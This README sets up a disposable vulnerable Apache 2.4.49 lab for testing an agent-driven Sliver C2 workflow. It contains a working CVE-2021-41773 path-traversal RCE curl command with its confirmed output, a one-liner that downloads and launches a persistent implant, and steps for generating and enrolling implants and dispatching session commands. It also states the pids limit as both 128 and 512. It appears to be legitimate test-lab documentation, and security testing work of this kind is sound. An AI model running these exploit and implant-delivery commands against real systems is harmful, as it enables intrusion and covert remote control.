# Vulnerable target lab: Apache HTTPd 2.4.49 (CVE-2021-41773)

A disposable, deliberately vulnerable target for exercising the Raptix C2
session flow end to end: the agent exploits a real CVE over the network,
delivers a real Sliver implant, and the resulting session is observable in
`sliver-client sessions` (Phase 1) and in the web console's C2 panels
(Phase 2, see `bridge-compose.yml` below).

The vulnerability is stock Apache 2.4.49 path traversal (CVE-2021-41773),
plus `mod_cgid` enabled by this lab's overlay so the traversed `/cgi-bin/`
path executes binaries — i.e. command execution, not just file read. This is
a personal test-lab target: it is not referenced by the production
`docker-compose.yml` stack, publishes no host ports, and drops all
capabilities except what httpd needs to run.

## Files

| File | Purpose |
|---|---|
| `Dockerfile` | Pinned `httpd:2.4.49` + curl + the vulnerability overlay |
| `conf/vuln.conf` | `LoadModule cgid_module`, `+ExecCGI` on `/cgi-bin` |
| `lab-entrypoint.sh` | Regenerates a random `/flag.txt` at every container start |
| `docker-compose.yml` | Target on the stack's sandbox network (external), hardened |
| `scripts/up.sh` / `scripts/down.sh` | Lifecycle (reads `RAPTIX_STACK_SANDBOX_NETWORK` from the repo `.env`) |

## Safety properties

- No host ports. The target is only reachable from containers on the Raptix
  sandbox network (the same network the agent's sandbox is on).
- `cap_drop: ALL` + `SETUID/SETGID/CHOWN` only, `no-new-privileges`,
  `mem_limit 256m`, `pids_limit 128`.
- The flag is regenerated at every start; treat container logs, the flag and
  any implant binary as lab-only material. Do not copy them into real
  engagement workspaces.

## Prerequisites

- Docker with Compose v2.
- The sandbox network must exist: the running Raptix stack creates it (named
  by `RAPTIX_STACK_SANDBOX_NETWORK`, default `raptix_sandbox-net`). For a
  standalone target test: `docker network create raptix_sandbox-net`.

## Lifecycle

```bash
./scripts/up.sh      # build + start on the sandbox network
./scripts/down.sh    # remove
```

## Verified exploit (build-time acceptance)

Run from the sandbox (or any container on the sandbox network). The POST
body is executed by `/bin/sh`; the leading `echo` emits the blank line that
separates CGI headers from the body — without it curl reports a 500.

```bash
# RCE + flag read (direct channel, before any C2 is involved)
curl -s --path-as-is -d 'echo; id; cat /flag.txt' \
  'http://vuln-target:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
```

Confirmed output on this build:

```
uid=1(daemon) gid=1(daemon) groups=1(daemon)
FLAG{target-lab-…}
```

Static file read through the traversal is intentionally NOT part of this
lab: on the official 2.4.49 image with `mod_cgid` loaded, traversal-mapped
static paths fail at file mapping (`AH00127 … above the root path`). The
flag match below therefore compares the direct CGI channel against the C2
channel — both are command execution, which is the property the lab tests.

## Phase 1 — agent loop against the production C2 (`ops_start("c2-sliver")`)

The full agent-driven loop, exactly as the orchestrator runs it (per
`packages/raptix-skills/raptix_skills/defs/standard/post-exploit/c2-sliver/SKILL.md`):

1. Raptix stack up (`raptix start` / launcher; opscontrol daemon alive —
   `make dev`/`make smoke` stacks are daemon-less and cannot spawn C2).
2. `./scripts/up.sh` — target joins the sandbox network.
3. Open an engagement whose scope/RoE includes `vuln-target` (under RoE
   `machine_enforcement: enforce`, out-of-scope connects are dropped by the
   sandbox nftables layer).
4. The agent discovers `http://vuln-target:8080`, verifies the traversal PoC,
   and calls `ops_start("c2-sliver")`.
5. **Config bootstrap (manual step — product gap, see below):** copy the
   auto-generated operator config from the C2 container into the shared
   workspace, then it appears in the sandbox at the path the skill expects:

   ```bash
   docker exec raptix-c2-sliver cat /workspace/.sliver-configs/decepticon.cfg \
     > "$RAPTIX_HOME/workspace/.sliver-configs/raptix.cfg"
   ```

   (Use the stack's actual workspace host path — the sandbox mounts it at
   `/workspace`.)
6. In the sandbox: `sliver-client import /workspace/.sliver-configs/raptix.cfg`,
   open the console in a tmux session, `mtls --lhost 0.0.0.0 --lport 8888`.
7. `generate --mtls c2-sliver:8888 --os linux --arch amd64 --skip-symbols
   --name lab_session --save /workspace/exploit/` (measured ~11 s with
   `--skip-symbols`; budget 300 s as the skill advises).
8. Stage and deliver through the RCE channel (implant ~17 MB):

   ```bash
   # in the sandbox: python3 -m http.server 8000 --directory /workspace/exploit
   # POST body executed on the target via the traversal PoC:
   curl -so /tmp/lab_session http://raptix-sandbox:8000/lab_session && \
     chmod +x /tmp/lab_session && \
     (setsid nohup /tmp/lab_session >/dev/null 2>&1 &)
   ```

   `setsid` matters: the implant must survive the CGI request ending.
9. `sessions` — expect the implant `ALIVE` with `Username daemon`, `Hostname`
   = the target container ID, `Remote Address` = the target's sandbox-net IP.
10. Flag match (objective acceptance): read `/flag.txt` through both channels
    and compare — direct PoC (step above) vs `use <session>` + `cat
    /flag.txt` in the Sliver console. Confirmed match on this lab build.

### Known product gap surfaced by this lab

`ops_start("c2-sliver")` starts the C2 container with the compose file's own
volume set only (`sliver_data`), so the entrypoint's operator config lands
inside the C2 container and never reaches the shared workspace the skill
reads (`/workspace/.sliver-configs/raptix.cfg`). Step 5 papers over it by
hand. Tracked as a follow-up; do not bake the workaround into product code.

## Phase 2 — sessions visible in the web console

Phase 1 sessions connect to the production `c2-sliver` and are NOT shown in
the web console: the web C2 provider is the IW-09 `sliver-bridge`, whose
session-ownership filter only accepts implants that check in to a
bridge-allocated listener (`sliver_bridge.py` `_owned()`). Phase 2 wires the
bridge next to this target so the web C2 panels get real, engagement-owned
sessions.

### Wiring

```bash
cp .env.example .env            # then set a private 32+ char token
./scripts/bridge-up.sh          # builds + starts the bridge (127.0.0.1:19000 -> 9000)
./scripts/bridge-down.sh        # removes it and its state volume
```

Run the web API with the paired provider env (loopback HTTP is accepted by
`apps/web/server/src/config/env.ts`):

```
SLIVER_BRIDGE_URL=http://127.0.0.1:19000
SLIVER_BRIDGE_TOKEN=<same token as .env>
```

The bridge joins the same sandbox network as the target, so the implant's
check-in URL — `http://sliver-bridge:<port>` — matches the ownership filter's
hostname allowlist.

### Live stack wiring (verified on this machine)

- The bridge and target were brought up on the **web stack's** sandbox
  network (`RAPTIX_STACK_SANDBOX_NETWORK=raptix_web_sandbox-net`), where the
  web API container and the web-spawned per-project sandboxes (`sbx-<slug>`)
  already live — so both the API (provider calls) and an agent sandbox
  (exploit staging) reach the lab without extra plumbing.
- The web API container reads `env_file: .env`; add
  `SLIVER_BRIDGE_URL=http://sliver-bridge:9000` + `SLIVER_BRIDGE_TOKEN` to the
  repo root `.env` and recreate it
  (`docker compose -f docker-compose.web-raptix.yml -f
  docker-compose.web-runtime.yml up -d --no-deps web-raptix-api`).
  `env.ts` accepts the `sliver-bridge` hostname over HTTP explicitly.
- The UI's own guardrails all engaged on this path and behaved correctly:
  the session-target scope gate refused the first dispatch (the target IP was
  outside the engagement's approved scope) until a scope revision adding the
  lab subnet was approved; the refusal is retained as a `failed` command
  record in the durable ledger — distinct from a successful one.
- Operator flow proven end to end through the API the UI calls: login →
  `POST …/c2/listeners` (port allocated) → implant enrolled for that port →
  delivered through the CVE-2021-41773 RCE channel → session owned by the
  engagement in `GET …/c2/sessions` → grant requested + approved →
  `POST …/c2/sessions/:sessionId/commands` with `/bin/cat /flag.txt` →
  `status: succeeded` and the recorded stdout matches the target's
  verification flag.

### Walkthrough (verified end to end)

1. Start a listener — from the web console (engagement → C2 tab) or
   directly, exactly as the console does:

   ```bash
   curl -s -X POST http://127.0.0.1:19000/v1/c2 \
     -H "Authorization: Bearer $SLIVER_BRIDGE_TOKEN" -H "Content-Type: application/json" \
     -d '{"op":"listeners.start","engagementId":"eng-lab-1","protocol":"http"}'
   # → {"listener":{"engagementId":"eng-lab-1","protocol":"http","port":18097,...}}
   ```

2. Enroll the implant (harness op inside the bridge container — the bridge
   exposes no generation endpoint by design). Use the **allocated port**:

   ```bash
   docker cp scripts/enroll_implant.py target-lab-sliver-bridge:/tmp/
   docker exec target-lab-sliver-bridge python /tmp/enroll_implant.py \
     --url http://sliver-bridge:18097 --name lab-httpd-implant
   ```

   The script talks to the bridge's own sliver-server over loopback gRPC and
   writes the ~23 MB binary to `/state/implants/<name>`.

3. Copy it into the engagement workspace (the sandbox mounts it at
   `/workspace`) and deliver it through the CVE-2021-41773 RCE channel, same
   staging pattern as Phase 1 step 8.
4. The implant checks in; `sessions.list` (the web console's Sessions tab)
   now reports it as engagement-owned with the full `C2Session` contract
   fields, including `listenerPort` and `activeC2`.
5. From the console (or `{"op":"sessions.execute",...}`), dispatch
   `/bin/cat /flag.txt` — the recorded outcome's stdout must equal the
   container's verification flag. Confirmed on this build: the value matched
   the flag read through the direct Phase 1 PoC channel.
6. Negative checks, both confirmed here:
   - A different `engagementId` sees no sessions (ownership isolation).
   - Dispatching to a killed implant's session after the 90 s stale window
     returns `409 Session is stale or disconnected`. Note the implant
     ignores SIGTERM delivered through its own session — kill it with
     `kill -9` via the direct CGI channel.

### Enrollment gotchas (encoded in `scripts/enroll_implant.py`)

- The build name goes on `GenerateReq.Name`, not `ImplantConfig`.
- `ImplantConfig.HTTPC2ConfigName` must be `"default"` (Sliver's
  `LoadHTTPC2ConfigByName` errors `record not found` on an empty name).
- The generated binary exceeds gRPC's 4 MB default receive cap; the script
  raises it to 64 MB.
- A failed/retried build with the same name collides
  (`UNIQUE constraint failed: implant_builds.name`) — regenerate under a new
  name; the bridge server is disposable.

### Lab sizing note

The target's `pids_limit` is 512: two concurrent Go implants plus httpd hold
~123 OS threads on a many-core host and exhaust anything smaller
(`pthread_create failed: 11` on implant relaunch).

## Troubleshooting

- `curl` returns 500 from the PoC: the POST body is missing the leading
  `echo;` (CGI header separator), see above.
- Sandbox cannot reach `vuln-target`: the target joined a different network
  than the running stack — re-run `./scripts/up.sh` (it picks up
  `RAPTIX_STACK_SANDBOX_NETWORK` from the repo `.env`) and confirm with
  `docker network inspect <network>`.
- `sliver-client console` fails to connect after a C2 rebuild: the sandbox's
  imported config belongs to the previous server CA — re-run the import
  after the step-5 copy.
- apt failures in the image build: the base is Debian buster; the Dockerfile
  already points apt at `archive.debian.org`.
